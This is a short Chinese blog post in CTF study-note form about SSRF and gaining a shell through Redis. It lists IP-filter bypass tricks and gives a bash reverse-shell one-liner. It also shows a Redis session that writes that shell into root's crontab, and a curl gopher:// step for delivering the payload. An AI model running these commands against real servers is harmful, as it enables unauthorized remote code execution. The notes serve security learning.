{"title":"redis与ssrf","slug":"SSRF","date":"2019-08-16T08:11:22.000Z","updated":"2019-09-03T14:24:58.258Z","comments":true,"path":"api/articles/SSRF.json","photos":[],"link":"","excerpt":"SSRF留坑，没整理完。我真是个小菜鸡~","covers":null,"content":"<p>SSRF留坑，没整理完。我真是个小菜鸡~</p>\n<a id=\"more\"></a>\n<h1 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h1><h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><h3 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents\"></a>file_get_contents</h3><h3 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen\"></a>fsockopen</h3><h3 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec\"></a>curl_exec</h3><h1 id=\"绕过IP限制\"><a href=\"#绕过IP限制\" class=\"headerlink\" title=\"绕过IP限制\"></a>绕过IP限制</h1><ul>\n<li>添加端口 127.0.0.1:80</li>\n<li>短网址 <a href=\"http://sina.lt/\" title=\"短网址\" target=\"_blank\" rel=\"noopener\">http://sina.lt/</a></li>\n<li>指向任意IP的域名 <a href=\"xip.io\">xip.io</a></li>\n<li>进制转换，点分十进制，八进制，二进制，十六进制，不同进制组合</li>\n</ul>\n<h2 id=\"302跳转\"><a href=\"#302跳转\" class=\"headerlink\" title=\"302跳转\"></a>302跳转</h2><p>结合<code>dict://  file://  gopher://</code></p>\n<pre><code>http://www.baidu.com@127.0.0.1</code></pre><h1 id=\"Gopher协议\"><a href=\"#Gopher协议\" class=\"headerlink\" title=\"Gopher协议\"></a>Gopher协议</h1><h2 id=\"定时任务写shell\"><a href=\"#定时任务写shell\" class=\"headerlink\" title=\"定时任务写shell\"></a>定时任务写shell</h2><p>crontab 格式 <a href=\"https://www.jb51.net/LINUXjishu/19905.html\" title=\"参数解释\" target=\"_blank\" rel=\"noopener\">https://www.jb51.net/LINUXjishu/19905.html</a></p>\n<p>反弹shell </p>\n<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1</code></pre><p>利用redis写入</p>\n<pre><code>root@kali:~# cd redis-2.8.3/\nroot@kali:~/redis-2.8.3# cd src\nroot@kali:~/redis-2.8.3/src# ./redis-cli\n127.0.0.1:6379&gt; * * /bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/2444 0&gt;&amp;1\\n&quot;\nOK\n127.0.0.1:6379&gt; config set dir /var/spool/cron\nOK\n127.0.0.1:6379&gt; config set dbfilename root\nOK\n127.0.0.1:6379&gt; save\nOK\n127.0.0.1:6379&gt; quit</code></pre><h1 id=\"使用工具无脑生成payload\"><a href=\"#使用工具无脑生成payload\" class=\"headerlink\" title=\"使用工具无脑生成payload\"></a>使用工具无脑生成payload</h1><p>先使用<code>./sniffer -p6379</code> 监听网卡，然后在本地redis服务中使用命令，随后断开，sniffer会打印出<code>payload</code></p>\n<p>我们只要加上<code>curl &#39;gopher://127.0.0.1:6379/_payload&#39;</code>即可</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://xz.aliyun.com/t/5844#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5844#toc-3</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"redis","slug":"redis","count":2,"path":"api/tags/redis.json"},{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"}]}